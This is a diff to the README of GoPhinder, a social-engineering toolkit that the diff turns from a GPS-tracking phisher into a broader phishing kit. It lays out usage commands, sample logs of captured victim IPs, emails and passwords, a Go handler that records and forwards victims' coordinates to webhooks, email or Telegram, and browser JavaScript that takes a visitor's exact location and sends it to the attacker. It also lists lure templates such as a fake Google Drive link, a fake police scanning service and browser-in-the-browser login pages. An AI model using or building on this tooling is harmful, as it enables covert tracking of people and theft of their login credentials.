@@ -1,10 +1,10 @@
 <div align="center">
   <img src="./assets/logo.png" alt="GoPhinder" />
   <h1><strong>GoPhinder</strong></h1>
-  <p>📍 Social Engineering Accurate Tracking of Devices 📍</p>
+  <p>📍 A Modular Social Engineering Toolkit 📍</p>
 </div>
 
-Inspired by [seeker](https://github.com/thewhiteh4t/seeker), this concept is much like phishing for credentials, but instead for precise GPS details. With the ease of capturing gps details via javascript, crafting an enticing website for a given target to grant location based permissions is one of many social engineering strategies.
+Inspired by [seeker](https://github.com/thewhiteh4t/seeker), GoPhinder is a very modular Social Engineering toolkit initially designed for device tracking, but supports other phishing based attack types.
 
 # Usage
 ```bash
@@ -40,9 +40,12 @@ go build -o gophinder run.go
 
 # sends location and ip logs to webhooks, email, telegram
 ./gophinder -t templates/index.html -config bots.json
+
+./gophinder -t templates/bitb.html | tee creds.txt
 ```
 
 ## Output
+Phishing for Location
 ```bash
 [+] Server running on http://localhost:8080
 ┌──[Access Log]────────────[2025-05-01 22:56:55]
@@ -60,16 +63,27 @@ go build -o gophinder run.go
 └───────────────────────────────────────────────────────
 ```
 
+Phishing for Login
+```bash
+┌──[Login Attempt]────────────[2025-05-04 11:59:24]
+│ [+] IP Address   : ::1
+│ [+] Email        : example@email.com
+│ [+] Password     : hello
+└────────────────────────────────────────────────────────
+```
+
 ## Additional output
 Additional logging/output can be attained and pushed to stdout with ease.
 An approach can look like such:
 ```golang
+// example handler seen to log location data
 func HandleTrack(templatePath string, notifier notifier.Notifier) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		var data struct { // gets data form json response form webpage
+		var data struct { // gets data form json response from template
       			Lat float64 `json:"lat"`
       			Lon float64 `json:"lon"`
 		}
+    // get json data
 		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
 			log.Printf("JSON decode error: %v", err)
 			http.Error(w, "Bad Request", http.StatusBadRequest)
@@ -85,7 +99,7 @@ func HandleTrack(templatePath string, notifier notifier.Notifier) http.HandlerFu
 		}
 		if notifier != nil {
 			// send to external webhooks etc.
-			go notifier.Notify("Location Log", fields)
+			go notifier.Notify("Location Log", fields) // optional
 		}
 		logging.LogBlock("Location Log", fields) // push to the log
 		w.WriteHeader(http.StatusOK) // push 200 back to client
@@ -98,16 +112,18 @@ Default templates can be found in the *templates* directory
 * Fake Google Drive Access Link
 * Fake Emergency/Police Local Scanning Service
 * Fake Private Event Finder
+* Browser In The Browser Template(s)
 
-By default, the templates only gather location based information as seen below
+By Default, templates send a json response to the backend for the data to be logged
 ```javascript
+// example to push lat and lon to the backend to be logged
 navigator.geolocation.getCurrentPosition(function(position) { // get exact location
     fetch(window.location.origin + "/track", { // send to backend
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({
+        body: JSON.stringify({ // json request
             lat: position.coords.latitude,
             lon: position.coords.longitude
         })
